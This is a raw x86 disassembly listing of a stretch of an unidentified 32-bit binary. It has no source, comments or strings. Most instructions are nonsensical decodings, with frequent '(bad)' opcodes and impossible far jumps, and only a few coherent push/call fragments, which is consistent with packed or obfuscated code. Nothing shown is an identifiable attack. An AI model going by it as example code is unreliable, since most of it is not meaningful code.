  407a7e:	jle    0x407ae6
  407a80:	xchg   edi,eax
  407a81:	mov    eax,0x66fccc3b
  407a86:	mov    ebp,0x5d90e914
  407a8b:	out    dx,al
  407a8c:	lds    ecx,FWORD PTR [ebp-0x3bb8308a]
  407a92:	xchg   ecx,eax
  407a93:	dec    ebp
  407a94:	xlat   BYTE PTR ds:[ebx]
  407a95:	dec    ebx
  407a96:	xor    DWORD PTR [ecx-0x7d],eax
  407a99:	lahf   
  407a9a:	xchg   ecx,eax
  407a9b:	shl    BYTE PTR [edx],1
  407a9d:	inc    ebp
  407a9e:	pop    esp
  407a9f:	fimul  DWORD PTR [edi]
  407aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aa2:	cmp    al,0xcb
  407aa4:	pop    ebp
  407aa5:	mov    ecx,0x66786789
  407aaa:	imul   edx,DWORD PTR [ebx+esi*4],0xfffffff0
  407aae:	sbb    al,0x3
  407ab0:	mov    gs,WORD PTR [eax-0x11]
  407ab3:	in     al,0x6b
  407ab5:	pop    ebp
  407ab6:	bound  ecx,QWORD PTR [eax-0x4f18ece3]
  407abc:	mov    bl,0xb3
  407abe:	call   0x9cc8:0xc63f3385
  407ac5:	mov    esi,0x6190496a
  407aca:	mov    cl,0xf0
  407acc:	rcl    DWORD PTR [edx-0x24],0xcb
  407ad0:	jae    0x407aa6
  407ad2:	ss dec eax
  407ad4:	leave  
  407ad5:	cs sub eax,0x91318ddd
  407adb:	push   0x9
  407add:	ss jo  0x407abb
  407ae0:	and    DWORD PTR [ebp-0x5a],ecx
  407ae3:	sub    edi,DWORD PTR [edx+edi*8-0x66]
  407ae7:	test   eax,0xbf833242
  407aec:	mov    WORD PTR [edx],ss
  407aee:	push   esp
  407aef:	sub    BYTE PTR [ebp-0x5eaabf8b],0xf9
  407af6:	xchg   DWORD PTR [ebx],ebx
  407af8:	outs   dx,BYTE PTR ds:[esi]
  407af9:	dec    edx
  407afa:	outs   dx,DWORD PTR ds:[esi]
  407afb:	(bad)  
  407afc:	xchg   esp,eax
  407afd:	mov    esi,?
  407aff:	mov    eax,0x63e892a2
  407b04:	or     edx,0xffffffc8
  407b07:	dec    edi
  407b08:	ins    DWORD PTR es:[edi],dx
  407b09:	int    0x3c
  407b0b:	(bad)  
  407b0c:	pop    ss
  407b0d:	dec    esi
  407b0e:	rol    DWORD PTR [edi+esi*4+0x6d],cl
  407b12:	add    ah,BYTE PTR ds:0x3c63385
  407b18:	(bad)  
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	pop    edx
  407b40:	and    DWORD PTR [eax+0x70c95724],esp
  407b46:	jo     0x407b68
  407b48:	jge    0x407bba
  407b4a:	jo     0x407b2b
  407b4c:	sbb    DWORD PTR [ebx],ebx
  407b4e:	lock sahf 
  407b50:	fldenv [ebx-0x66194bb2]
  407b56:	out    dx,eax
  407b57:	mov    ch,0x4c
  407b59:	xchg   ecx,eax
  407b5a:	inc    ecx
  407b5b:	cmp    cl,BYTE PTR [edi+0x25]
  407b5e:	stos   DWORD PTR es:[edi],eax
  407b5f:	sbb    DWORD PTR [ecx+0x2d8feda8],edx
  407b65:	test   BYTE PTR [ebx],ch
  407b67:	pop    ebx
  407b68:	retf   
  407b69:	sahf   
  407b6a:	mov    esi,0x2f93047d
  407b6f:	sbb    bl,ah
  407b71:	js     0x407b61
  407b73:	push   eax
  407b74:	push   cs
  407b75:	push   esp
  407b76:	mov    ah,0x14
  407b78:	in     eax,0xec
  407b7a:	add    dl,BYTE PTR [ecx-0x15]
  407b7d:	rol    BYTE PTR [ecx-0x69],1
  407b80:	ss jmp 0xee71:0xb139a69a
  407b88:	test   al,0xb0
  407b8a:	cmc    
  407b8b:	mov    esi,DWORD PTR [edx+0x6ab08d00]
  407b91:	mov    cs,esp
  407b93:	cmp    eax,0x6cb49588
  407b98:	retf   
  407b99:	xchg   DWORD PTR [ebx-0x4f],edx
  407b9c:	fwait
  407b9d:	sub    al,BYTE PTR [ebx]
  407b9f:	mov    eax,0x26dee4c
  407ba4:	sub    dl,BYTE PTR [ecx+0x26e3b2ac]
  407baa:	pop    ebp
  407bab:	test   al,0x31
  407bad:	outs   dx,BYTE PTR ds:[esi]
  407bae:	(bad)  
  407baf:	jmp    0x6145fac9
  407bb4:	sub    DWORD PTR [eax+0x13],ebp
  407bb7:	repnz lods al,BYTE PTR ds:[esi]
  407bb9:	mov    cl,0x6b
  407bbb:	aad    0x4a
  407bbd:	and    DWORD PTR [edi-0x66262326],esp
  407bc3:	mov    ecx,0x9a8ce62
  407bc8:	mov    eax,0x46610fc
  407bcd:	sbb    BYTE PTR [ecx-0x17],cl
  407bd0:	xchg   BYTE PTR [edi],dh
  407bd2:	sub    eax,DWORD PTR [esi-0x515973e6]
  407bd8:	dec    ecx
  407bd9:	les    eax,FWORD PTR [edx-0x6f]
  407bdc:	stos   BYTE PTR es:[edi],al
  407bdd:	ret    
  407bde:	inc    esi
  407bdf:	cmc    
  407be0:	nop
  407be1:	push   0x70
  407be3:	arpl   WORD PTR [edi],dx
  407be5:	shl    BYTE PTR [edi],cl
  407be7:	rol    DWORD PTR [edx-0x14],cl
  407bea:	jno    0x407c04
  407bec:	into   
  407bed:	jns    0x407b70
  407bef:	inc    ebx
  407bf0:	and    DWORD PTR [ecx],ebx
  407bf2:	gs push esp
  407bf4:	mov    ds:0xbbb7e788,eax
  407bf9:	pop    esi
  407bfa:	jnp    0x407bd8
  407bfc:	or     eax,ebp
  407bfe:	in     eax,dx
  407bff:	sub    bh,dl
  407c01:	ins    DWORD PTR es:[edi],dx
  407c02:	repz fcomp QWORD PTR [esi-0x61]
  407c06:	(bad)  
  407c07:	paddd  mm1,QWORD PTR [eax-0x1e]
  407c0b:	ds lahf 
  407c0d:	mov    ebp,0x22d968e4
  407c12:	push   0x25
  407c14:	inc    eax
  407c15:	out    0x91,al
  407c17:	stos   DWORD PTR es:[edi],eax
  407c18:	and    BYTE PTR [ecx-0x1a],bl
  407c1b:	addr16 sbb ecx,esp
  407c1e:	sub    ecx,DWORD PTR [eax+0x49]
  407c21:	in     eax,0xb7
  407c23:	out    dx,al
  407c24:	jae    0x407beb
  407c26:	or     DWORD PTR [eax+0x31],esp
  407c29:	add    BYTE PTR [edx],dl
  407c2b:	retf   0x13e8
  407c2e:	ins    BYTE PTR es:[edi],dx
  407c2f:	pop    ebp
  407c30:	je     0x407be8
  407c32:	xlat   BYTE PTR ds:[ebx]
  407c33:	or     cl,BYTE PTR [esi-0x3a]
  407c36:	add    bl,BYTE PTR [ecx-0x43]
  407c39:	xchg   BYTE PTR [edi-0x244157d4],dl
  407c3f:	jmp    0x40d44c10
  407c44:	add    eax,DWORD PTR [ecx]
  407c46:	pop    esi
  407c47:	sahf   
  407c48:	or     eax,0xe9e46aa5
  407c4d:	int3   
  407c4e:	dec    ebp
  407c4f:	mov    edi,0xb658d03
  407c54:	je     0x407c43
  407c56:	popa   
  407c57:	stos   DWORD PTR es:[edi],eax
  407c58:	mov    eax,ds:0x118c8856
  407c5d:	xor    al,0x6f
  407c5f:	in     al,0x6a
  407c61:	or     BYTE PTR [edx-0x3c],bl
  407c64:	xchg   ecx,eax
  407c65:	aas    
  407c66:	mov    esi,0xfb20d184
  407c6b:	xchg   ebx,eax
  407c6c:	and    BYTE PTR [esi+edx*8],bl
  407c6f:	dec    ebx
  407c70:	ds mov dh,0x2d
  407c73:	push   cs
  407c74:	pop    ebp
  407c75:	pop    eax
  407c76:	test   eax,0x90822efd
  407c7b:	xchg   DWORD PTR [ebx+0x6f0cc9b4],esp
  407c81:	mov    BYTE PTR [ebx],dh
  407c83:	shl    DWORD PTR [ecx+esi*8-0x6fe649af],cl
  407c8a:	mov    ch,0x7f
  407c8c:	leave  
  407c8d:	in     al,0x87
  407c8f:	hlt    
  407c90:	mul    BYTE PTR [ecx+0x8]
  407c93:	(bad)  
  407c94:	sub    eax,0x8394a7af
  407c99:	dec    ecx
  407c9a:	add    eax,0x10dfafe9
  407c9f:	mov    al,ds:0x5b509437
  407ca4:	and    dl,0x9f
  407ca7:	repz pop edi
  407ca9:	rol    DWORD PTR [ebx+0xd],0xd8
  407cad:	and    cl,dh
  407caf:	or     DWORD PTR [edx],0xffffffcb
  407cb2:	mov    ah,0x6
  407cb4:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cb6:	dec    ebp
  407cb7:	arpl   cx,dx
  407cb9:	mov    DWORD PTR [edx-0x63],ecx
  407cbc:	leave  
  407cbd:	mov    edx,0x5c608796
  407cc2:	repnz or eax,0x1d51db99
  407cc8:	retf   
  407cc9:	sahf   
  407cca:	les    ecx,FWORD PTR cs:[ecx-0x29c6ee11]
  407cd1:	pop    DWORD PTR [ebp+0x56]
  407cd4:	mov    bh,0xab
  407cd6:	stos   BYTE PTR es:[edi],al
  407cd7:	outs   dx,DWORD PTR ds:[esi]
  407cd8:	push   cs
  407cd9:	and    DWORD PTR [ecx],edx
  407cdb:	(bad)  
  407cdc:	in     eax,0x83
  407cde:	leave  
  407cdf:	aas    
  407ce0:	in     eax,dx
  407ce1:	loop   0x407d46
  407ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ce4:	mov    ebp,0x536b15a9
  407ce9:	sbb    DWORD PTR [ebp+0x1b],ebp
  407cec:	mov    al,ds:0xaf81b4ba
  407cf1:	mov    ch,0x1d
  407cf3:	fsub   QWORD PTR [eax+0x7a]
  407cf6:	(bad)  [eax+0x55]
  407cf9:	(bad)  
  407cfa:	fistp  WORD PTR [edi*8+0x601261ad]
  407d01:	mov    bh,0x70
  407d03:	jp     0x407ca0
  407d05:	cmp    edx,DWORD PTR [edx-0x57e2cd6a]
  407d0b:	push   eax
  407d0c:	cmc    
  407d0d:	sub    al,0xfa
  407d0f:	and    al,0x5b
  407d11:	push   ebp
  407d12:	sbb    bh,cl
  407d14:	sbb    ecx,edx
  407d16:	add    al,0xc2
  407d18:	mov    esp,0x376f200
  407d1d:	fld    TBYTE PTR [ecx-0x521e16b]
  407d23:	or     esi,ebp
  407d25:	xor    ax,0x604c
  407d29:	loopne 0x407d12
  407d2b:	mul    BYTE PTR es:[esi+0x38bac2f7]
  407d32:	inc    ebp
  407d33:	xchg   esp,eax
  407d34:	inc    ecx
  407d35:	sub    eax,0x6799be33
  407d3a:	outs   dx,BYTE PTR ds:[esi]
  407d3b:	ja     0x407da0
  407d3d:	mov    ecx,0x1e2c4bff
  407d42:	push   ebp
  407d43:	sbb    bh,BYTE PTR [edi+edx*8-0x75227ac8]
  407d4a:	xchg   ebp,eax
  407d4b:	out    0xac,eax
  407d4d:	arpl   WORD PTR [edx-0x5e],cx
  407d50:	into   
  407d51:	nop
  407d52:	cmp    DWORD PTR [eax],ebp
  407d54:	mov    ds:0x1eb1efe4,al
  407d59:	outs   dx,DWORD PTR ds:[esi]
  407d5a:	popa   
  407d5b:	adc    edx,ecx
  407d5d:	arpl   WORD PTR [esi],si
  407d5f:	cdq    
  407d60:	lahf   
  407d61:	lea    edx,[esi-0x19]
  407d64:	cmp    BYTE PTR ss:[bp+di],0x9b
  407d69:	sbb    bl,dl
  407d6b:	stc    
  407d6c:	ror    DWORD PTR [esi-0x5b],0x4a
  407d70:	xor    BYTE PTR [ebx+0x56],bh
  407d73:	adc    al,BYTE PTR [ebx-0x7e25a905]
  407d79:	js     0x407d50
  407d7b:	mov    cl,0x69
  407d7d:	shl    DWORD PTR [edx+0x5fb34b0e],cl
  407d83:	cmp    esi,DWORD PTR gs:[edx]
  407d86:	sbb    DWORD PTR [ecx],ebp
  407d88:	jle    0x407d95
  407d8a:	aam    0xd1
  407d8c:	adc    eax,0x8b355ad9
  407d91:	sub    eax,0x88595716
  407d96:	repnz clc 
  407d98:	sbb    eax,0xa7b342e0
  407d9d:	jmp    0x407dcf
  407d9f:	out    dx,eax
  407da0:	jle    0x407def
  407da2:	in     eax,0xef
  407da4:	xchg   edx,eax
  407da6:	icebp  
  407da7:	cmp    ebp,ecx
  407da9:	dec    ebp
  407daa:	push   ss
  407dab:	xor    DWORD PTR [ebp-0x188740c2],esp
  407db1:	inc    ecx
  407db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407db3:	mov    ebp,DWORD PTR ds:0xa094cb57
  407db9:	mov    edi,0x47881cda
  407dbe:	test   BYTE PTR [eax-0x68ad7d5],bh
  407dc4:	sub    DWORD PTR [ecx],ecx
  407dc6:	xchg   ebx,eax
  407dc7:	push   ebp
  407dc8:	adc    BYTE PTR [edx+0x7b],dl
  407dcb:	js     0x407dac
  407dcd:	lods   eax,DWORD PTR ds:[esi]
  407dce:	and    BYTE PTR [esi+0x10],cl
  407dd1:	cmp    BYTE PTR [ebp-0x90823ab],cl
  407dd7:	pop    eax
  407dd8:	jge    0x407e18
  407dda:	jecxz  0x407dc9
  407ddc:	jl     0x407d80
  407dde:	fcmovb st,st(3)
  407de0:	fst    DWORD PTR [ecx+0x21c4cc9e]
  407de6:	imul   ebx,DWORD PTR [edi+edx*1-0x70],0x7f79717e
  407dee:	outs   dx,DWORD PTR ds:[esi]
  407def:	or     dh,0x82
  407df2:	ret    0xeaff
  407df5:	dec    ebp
  407df6:	inc    ebp
  407df7:	xchg   ecx,eax
  407df8:	mov    ch,0x5b
  407dfa:	xor    esp,DWORD PTR [edx]
  407dfc:	sbb    al,0x42
  407dfe:	sbb    BYTE PTR [edx],al
  407e00:	(bad)  
  407e01:	(bad)  
  407e02:	icebp  
  407e03:	cmp    al,0xc2
  407e05:	sub    BYTE PTR [edi-0x592030ce],dh
  407e0b:	xchg   esp,eax
  407e0c:	in     eax,dx
  407e0d:	sub    BYTE PTR [eax+ecx*8-0x1cd52fd2],al
  407e14:	div    BYTE PTR [eax+0x47cba450]
  407e1a:	mov    BYTE PTR [edi-0xc1f6126],bl
  407e20:	xor    eax,0xd1d48d6b
  407e25:	mov    ebx,0x1db7cca1
  407e2a:	out    0x7e,al
  407e2c:	jo     0x407e76
  407e2e:	test   eax,0x3f51cba9
  407e33:	in     eax,0x50
  407e35:	stos   DWORD PTR es:[edi],eax
  407e36:	in     al,0xc9
  407e38:	popf   
  407e39:	mul    DWORD PTR [esi]
  407e3b:	jae    0x407e94
  407e3d:	imul   edx,DWORD PTR [ecx+0x78ca4e00],0x65
  407e44:	cwde   
  407e45:	cmc    
  407e46:	mov    DWORD PTR [edx-0x6e],0x8e3861b6
  407e4d:	cmc    
  407e4e:	add    dl,BYTE PTR [edx+ebx*2-0x2ac36629]
  407e55:	or     DWORD PTR [ebx-0x2a],ebx
  407e58:	fisub  WORD PTR [esi+0x70d375a7]
  407e5e:	loop   0x407e50
  407e60:	sub    al,0x7c
  407e62:	mov    ebx,0x8dd46d86
  407e68:	into   
  407e69:	aaa    
  407e6a:	dec    ebx
  407e6b:	sbb    al,0x92
  407e6d:	dec    esi
  407e6e:	or     ah,BYTE PTR [ecx-0x7381b14a]
  407e74:	jecxz  0x407e66
  407e76:	(bad)  
  407e77:	jle    0x407dfa
  407e79:	and    BYTE PTR [ebx],cl
  407e7b:	call   0x4120bb
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	ror    bl,cl
  407e9a:	out    dx,al
  407e9b:	sbb    eax,DWORD PTR [edi]
  407e9d:	aad    0x70
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407f22
  407ea5:	repnz pop esp
  407ea7:	sti    
  407ea8:	(bad)  
  407ea9:	adc    DWORD PTR [ebx+0x50],edx
  407eac:	pop    ss
  407ead:	loope  0x407e88
  407eaf:	fdiv   DWORD PTR [ebx]
  407eb1:	sbb    edx,0xffffffa4
  407eb4:	aas    
  407eb5:	and    BYTE PTR [esi-0x2f],bh
  407eb8:	jb     0x407eb8
  407eba:	pop    edi
  407ebb:	and    eax,0x41ad252b
  407ec0:	dec    ebx
  407ec1:	xchg   esp,eax
  407ec2:	nop
  407ec3:	(bad)  
  407ec4:	mov    BYTE PTR gs:0x8298a44f,bl
  407ecb:	stc    
  407ecc:	jo     0x407ed0
  407ece:	inc    edi
  407ecf:	push   ss
  407ed0:	imul   bl
  407ed2:	xlat   BYTE PTR ds:[ebx]
  407ed3:	js     0x407ea7
  407ed5:	mov    bh,0x52
  407ed7:	push   esi
  407ed8:	pop    es
  407ed9:	out    0xea,eax
  407edb:	cmp    ebx,ebx
  407edd:	adc    esi,DWORD PTR [esi]
  407edf:	adc    al,BYTE PTR [ecx-0x4d566e67]
  407ee5:	loop   0x407ea4
  407ee7:	scas   eax,DWORD PTR es:[edi]
  407ee8:	jno    0x407e9b
  407eea:	jb     0x407f61
  407eec:	add    DWORD PTR [edx*2-0x3c013593],esp
  407ef3:	adc    al,0x7f
  407ef5:	adc    eax,0xaafe2d8a
  407efa:	je     0x407eac
  407efc:	dec    edi
  407efd:	sbb    BYTE PTR [edi-0x7e442c5a],ch
  407f03:	std    
  407f04:	mov    ah,0x75
  407f06:	(bad)  
  407f07:	fxch   st(2)
  407f09:	mov    ebp,DWORD PTR [ebp+0x46]
  407f0c:	pop    edx
  407f0d:	aas    
  407f0e:	add    esi,DWORD PTR [esi+0x48]
  407f11:	push   edi
  407f12:	push   ebp
  407f13:	jmp    0x19debe8a
  407f18:	les    ebx,FWORD PTR [ebp+0x1f]
  407f1b:	jecxz  0x407f44
  407f1d:	aad    0xf1
  407f1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f20:	nop
  407f21:	je     0x407edf
  407f23:	push   esp
  407f24:	cwde   
  407f25:	shr    BYTE PTR [eax],cl
  407f27:	sar    BYTE PTR [edi],cl
  407f29:	out    0xb2,eax
  407f2b:	mov    cl,0xe8
  407f2d:	neg    DWORD PTR ds:0xc94a6067
  407f33:	push   esp
  407f34:	aad    0x39
  407f36:	cwde   
  407f37:	or     DWORD PTR [eax+0x7b],0x5e8ce964
  407f3e:	sti    
  407f3f:	add    ah,BYTE PTR [ebx-0x174119d3]
  407f45:	scas   al,BYTE PTR es:[edi]
  407f46:	(bad)  
  407f47:	adc    eax,eax
  407f49:	or     eax,0x616b3d1b
  407f4e:	outs   dx,DWORD PTR ds:[esi]
  407f4f:	mov    ds:0x5c64b53b,eax
  407f54:	dec    esp
  407f55:	or     ch,BYTE PTR [esi+0x29988562]
  407f5b:	xchg   ebp,eax
  407f5c:	sub    eax,0x2f2ef961
  407f61:	(bad)  
  407f62:	xor    ch,ah
  407f64:	add    esp,DWORD PTR [edx+0x6da30271]
  407f6a:	xchg   DWORD PTR [esi],edx
  407f6c:	dec    ebp
  407f6d:	ja     0x407f75
  407f6f:	adc    DWORD PTR [edx-0x511c1790],edi
  407f75:	ins    BYTE PTR es:[edi],dx
  407f76:	or     eax,0x99fea914
  407f7b:	sub    BYTE PTR ds:0xff12eed0,dh
  407f81:	sar    BYTE PTR [ecx],0x98
  407f84:	out    dx,eax
  407f85:	jmp    0x407fd7
  407f87:	sbb    esi,DWORD PTR [ecx]
  407f89:	add    eax,0x86504b6
  407f8e:	xor    ch,dl
  407f90:	(bad)  
  407f91:	mov    WORD PTR [ecx],ss
  407f93:	repnz repnz xlat BYTE PTR ds:[ebx]
  407f96:	jmp    0x407f87
  407f98:	cmc    
  407f99:	sbb    BYTE PTR [ebx],0xe2
  407f9c:	cwde   
  407f9d:	mov    bl,0xb1
  407f9f:	inc    ebx
  407fa0:	xchg   ch,al
  407fa2:	jns    0x408003
  407fa4:	fwait
  407fa5:	mov    ds:0x63ecc3ac,eax
  407faa:	jmp    0x407f91
  407fac:	mov    ds:0x368d8e82,eax
  407fb1:	imul   ebx,DWORD PTR [ecx+0x60],0x49da0c6b
  407fb8:	or     al,dl
  407fba:	or     DWORD PTR [ebx],ecx
  407fbc:	outs   dx,BYTE PTR ds:[esi]
  407fbd:	hlt    
  407fbe:	shl    BYTE PTR [bx-0x25],0x63
  407fc3:	fwait
  407fc4:	mov    ds:0x10200ac6,eax
  407fc9:	pop    ebx
  407fca:	into   
  407fcb:	aas    
  407fcc:	pop    edx
  407fcd:	shl    DWORD PTR ds:0x89bac498,cl
  407fd3:	or     al,0xed
  407fd5:	(bad)  
  407fd6:	in     al,dx
  407fd7:	ins    DWORD PTR es:[edi],dx
  407fd8:	sbb    al,0x89
  407fda:	add    al,0x86
  407fdc:	daa    
  407fdd:	jg     0x407fb7
  407fdf:	and    dh,BYTE PTR [edi+0x2]
  407fe2:	loope  0x40803e
  407fe4:	jo     0x407f93
  407fe6:	scas   al,BYTE PTR es:[edi]
  407fe7:	sbb    ecx,DWORD PTR [esi-0x6c]
  407fea:	add    dh,BYTE PTR [edx]
  407fec:	sub    al,0xea
  407fee:	cmp    al,0x2
  407ff0:	pop    ebx
  407ff1:	test   al,0x4c
  407ff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ff4:	push   esp
  407ff5:	(bad)  
  407ff6:	xchg   edx,eax
  407ff7:	dec    eax
  407ff8:	gs pushf 
  407ffa:	mov    gs,WORD PTR [ebx-0xb]
  407ffd:	push   ds
  407ffe:	sbb    eax,0x159bd5a5
  408003:	into   
  408004:	jmp    0xb1c:0x9abba51
  40800b:	xchg   edx,eax
  40800c:	bound  ecx,QWORD PTR [ebx-0x20]
  40800f:	test   ebx,ebx
  408011:	je     0x40801b
  408013:	int3   
  408014:	or     ah,BYTE PTR [esi+0x6f6d019c]
  40801a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40801b:	xchg   ebx,eax
  40801c:	(bad)  
  40801d:	pop    ss
  40801e:	fwait
  40801f:	inc    ecx
  408020:	(bad)  
  408021:	jnp    0x407fbf
  408023:	repnz xchg ecx,eax
  408025:	push   ss
  408026:	jbe    0x407fbe
  408028:	jns    0x40803a
  40802a:	xor    BYTE PTR [edi-0x54],0x3b
  40802e:	mov    eax,ds:0x901f5bc8
  408033:	sbb    cl,al
  408035:	pop    esi
  408036:	repnz mov dl,0x92
  408039:	xor    dh,ah
  40803b:	mov    DWORD PTR [ebx-0x15],esp
  40803e:	jo     0x407fff
  408040:	mov    esp,0x6dd3ba9c
  408045:	pop    ebp
  408046:	(bad)  [ebp+0x4b7dcda2]
  40804c:	in     eax,0xfe
  40804e:	dec    edi
  40804f:	push   ebp
  408050:	xchg   ebx,eax
  408051:	xor    bl,dh
  408053:	sar    DWORD PTR es:[ebx-0x5aa71a6b],0x63
  40805b:	imul   esp,esi,0xeb8ec5ce
  408061:	jns    0x4080c9
  408063:	(bad)  
  408064:	mov    eax,ds:0x696d208f
  408069:	cdq    
  40806a:	jae    0x40805f
  40806c:	arpl   WORD PTR [edx+0x3c6ff4cd],bx
  408072:	jl     0x40808a
  408074:	jmp    0x5191:0x10af2f71
  40807b:	mov    ebp,0x451e8ff
  408080:	loop   0x40806a
  408082:	pop    ss
  408083:	call   0x3ec66d7
  408088:	jmp    0xbf71:0xb44baeb9
  40808f:	jbe    0x4080c9
  408091:	add    DWORD PTR [ecx+0x45bc6f0c],ebp
  408097:	test   al,0xd2
  408099:	mov    cl,0xb3
  40809b:	or     DWORD PTR [edx*8-0x4ab2f000],eax
  4080a2:	loope  0x40807d
  4080a4:	and    DWORD PTR [ecx+edx*8],ebp
  4080a7:	sbb    al,0x1a
  4080a9:	adc    eax,0x1b6bde81
  4080ae:	push   ds
  4080af:	int3   
  4080b0:	gs daa 
  4080b2:	sub    DWORD PTR [edx+edx*4],esi
  4080b5:	xor    bl,BYTE PTR [esi+0x10]
  4080b8:	fldenv [eax+0x190f559e]
  4080be:	mov    esp,0xc0c0f0f8
  4080c3:	adc    dh,BYTE PTR [edi-0xb6de50e]
  4080c9:	adc    DWORD PTR [ebx],esp
  4080cb:	out    dx,al
  4080cc:	xor    BYTE PTR [ecx-0xf9ad724],ch
  4080d2:	fld    QWORD PTR [edi-0x6b27bdb]
  4080d8:	das    
  4080d9:	scas   al,BYTE PTR es:[edi]
  4080da:	mov    ah,0xd2
  4080dc:	xor    eax,0x51a9fe72
  4080e1:	and    ch,BYTE PTR [ecx]
  4080e3:	mov    ah,0xfa
  4080e5:	icebp  
  4080e6:	loop   0x408105
  4080e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080e9:	popa   
  4080ea:	jns    0x408165
  4080ec:	fsin   
  4080ee:	es jecxz 0x408117
  4080f1:	sbb    DWORD PTR [esi-0x2e],ebp
  4080f4:	mov    ah,0xa6
  4080f6:	push   esi
  4080f7:	push   esi
  4080f8:	inc    esp
  4080f9:	fmul   st(6),st
  4080fb:	arpl   WORD PTR [ebx-0x51d70cfd],di
  408101:	mov    al,ds:0x9fd51857
  408106:	fsubr  st,st(5)
  408108:	scas   al,BYTE PTR es:[edi]
  408109:	stos   BYTE PTR es:[edi],al
  40810a:	int    0x10
  40810c:	loope  0x40815e
  40810e:	add    al,0x77
  408110:	sub    BYTE PTR [edx+eiz*4+0x2323a48e],dl
  408117:	sub    DWORD PTR [ecx],edx
  408119:	push   0x45
  40811b:	mov    esp,DWORD PTR [edx+eax*1]
  40811e:	or     BYTE PTR [esi+eax*1],bl
  408121:	xchg   esi,eax
  408122:	inc    ecx
  408123:	inc    ecx
  408124:	add    ebp,ebp
  408126:	mov    BYTE PTR [edx+0x3],cl
  408129:	and    edx,DWORD PTR [eax]
  40812b:	fcmovbe st,st(2)
  40812d:	in     eax,0x80
  40812f:	lods   eax,DWORD PTR ds:[esi]
  408130:	bound  ebp,QWORD PTR ds:0xaaee247b
  408136:	stos   BYTE PTR es:[edi],al
  408137:	sub    DWORD PTR [edx-0x7e],0x1f
  40813b:	ins    DWORD PTR es:[edi],dx
  40813c:	pop    edx
  40813d:	scas   al,BYTE PTR es:[edi]
  40813e:	shl    DWORD PTR [eax],0x5d
  408141:	gs sub al,0x8f
  408144:	jae    0x408182
  408146:	sub    BYTE PTR [ebx],cl
  408148:	mov    al,0x12
  40814a:	mov    ecx,0x3a342cd9
  40814f:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  408151:	cmp    BYTE PTR [ecx+0x35],ch
  408154:	cmp    edi,DWORD PTR [ecx]
  408156:	pop    esi
  408157:	pop    ss
  408158:	cwde   
  408159:	cmp    ebx,DWORD PTR [ebx]
  40815b:	jns    0x7fd01088
  408161:	pop    esi
  408162:	or     cl,BYTE PTR [edx+0x62]
  408165:	dec    ebx
  408166:	in     al,0x78
  408168:	push   ss
  408169:	dec    edi
  40816a:	cmp    eax,0x45690d0a
  40816f:	sub    ebp,DWORD PTR [ebx+0x7a19034b]
  408175:	inc    eax
  408176:	nop
  408177:	aas    
  408178:	pop    ebx
  408179:	or     DWORD PTR [ecx-0x7],ebp
  40817c:	mov    dl,0x75
  40817e:	xchg   esi,eax
  40817f:	xor    ah,dh
  408181:	cwde   
  408182:	mov    bl,0x8f
  408184:	adc    esp,DWORD PTR [edi]
  408186:	sahf   
  408187:	rcl    BYTE PTR [ecx],0xc
  40818a:	(bad)  
  40818b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40818c:	je     0x408190
  40818e:	push   eax
  40818f:	and    dl,BYTE PTR [edi+0x9]
  408192:	push   ecx
  408193:	fwait
  408194:	dec    eax
  408195:	cli    
  408196:	add    ebx,eax
  408198:	xor    eax,0x8bf3d2a3
  40819d:	arpl   WORD PTR [ebx],ax
  40819f:	fs dec esp
  4081a1:	ror    BYTE PTR [edi],1
  4081a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081a4:	adc    dh,BYTE PTR [eax]
  4081a6:	adc    al,ah
  4081a8:	stc    
  4081a9:	dec    ecx
  4081aa:	call   0x74d0:0x5c2273c
  4081b1:	retf   
  4081b2:	daa    
  4081b3:	into   
  4081b4:	add    BYTE PTR ds:0xea07a839,ch
  4081ba:	sub    al,0x62
  4081bc:	mov    eax,esp
  4081be:	jnp    0x408194
  4081c0:	xor    cl,bh
  4081c2:	mov    esp,0x50fdeb65
  4081c7:	test   ebp,ebx
  4081c9:	ds jo  0x408161
  4081cc:	ja     0x40824c
  4081ce:	cdq    
  4081cf:	ins    BYTE PTR es:[edi],dx
  4081d0:	sub    al,0x18
  4081d2:	mov    BYTE PTR [eax-0x76fbba73],bh
  4081d8:	inc    ebp
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
